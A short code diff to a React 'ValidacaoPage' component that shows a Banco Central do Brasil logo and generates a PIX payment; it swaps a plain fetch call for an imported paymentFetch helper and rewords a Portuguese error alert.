@@ -1,3 +1,4 @@
+import { paymentFetch } from "@/lib/paymentClient";
 import { useState, useEffect, useMemo } from "react";
 import logoBancoCentral from "@assets/banco-central-do-brasil-logo-4-removebg-preview_1782870144810.png";
 import { useLocation } from "wouter";
@@ -193,7 +194,7 @@ export default function ValidacaoPage() {
       const amount = pixAmount;
       const valor = Math.round(amount * 100);
 
-      const pixResponse = await fetch("/api/gerar-pix", {
+      const pixResponse = await paymentFetch("/api/gerar-pix", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -298,7 +299,7 @@ export default function ValidacaoPage() {
       }
     } catch (error) {
       console.error("Erro ao processar pagamento:", error);
-      alert("Erro ao processar pagamento. Tente novamente.");
+      alert("pagamento indisponível, tente novamente");
     } finally {
       setIsProcessingPayment(false);
     }
